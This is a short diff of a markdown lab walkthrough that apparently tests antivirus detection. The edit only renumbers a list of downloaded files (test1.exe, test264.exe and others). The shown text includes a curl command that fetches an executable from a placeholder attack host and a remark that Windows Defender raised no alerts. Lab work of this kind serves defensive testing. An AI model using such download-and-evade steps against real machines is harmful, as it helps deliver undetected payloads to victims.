@@ -25,10 +25,10 @@
 3. Run the following command with my new favorite living off the land binary for dowloading remote files. 
 `curl http://<NIX-ATTACK-HOST>:8000/test1.exe -o test1.exe`
 4. Once you have this worked out, download all the files you created on the linux attack host just changing the file names.
-    - test1.exe
-    - test264.exe
-    - test232.exe
-    - test332-arg.exe
+    1. test1.exe
+    2. test264.exe
+    3. test232.exe
+    4. test332-arg.exe
 5. This is your first detection example...no alerts from windows defender.
 
 ## What does virust total have to say about all this?
